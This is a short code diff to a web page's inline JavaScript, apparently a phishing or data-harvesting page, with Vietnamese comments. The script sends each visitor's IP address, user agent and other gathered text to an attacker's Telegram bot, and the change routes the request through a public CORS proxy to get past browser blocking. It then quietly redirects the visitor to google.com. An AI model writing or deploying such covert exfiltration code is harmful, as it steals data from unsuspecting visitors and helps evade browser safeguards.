@@ -20,14 +20,16 @@
                 `🌐 IP nguồn: ${userIp}\n` +
                 `📱 Thiết bị: ${navigator.userAgent}`;
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(messageText);
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(messageText);
+            
+            // Sử dụng proxy công khai để né hoàn toàn CORS của trình duyệt
+            const proxyUrl = `https://api.allorigins.win/raw?url=` + encodeURIComponent(telegramUrl);
 
-            // Dùng fetch kết hợp chế độ no-cors để gửi ngầm dữ liệu lên Telegram mà không bị trình duyệt chặn
-            fetch(url, { mode: 'no-cors' })
+            fetch(proxyUrl)
                 .finally(() => {
                     setTimeout(() => {
                         window.location.href = 'https://www.google.com';
-                    }, 500);
+                    }, 600);
                 });
         });
     </script>
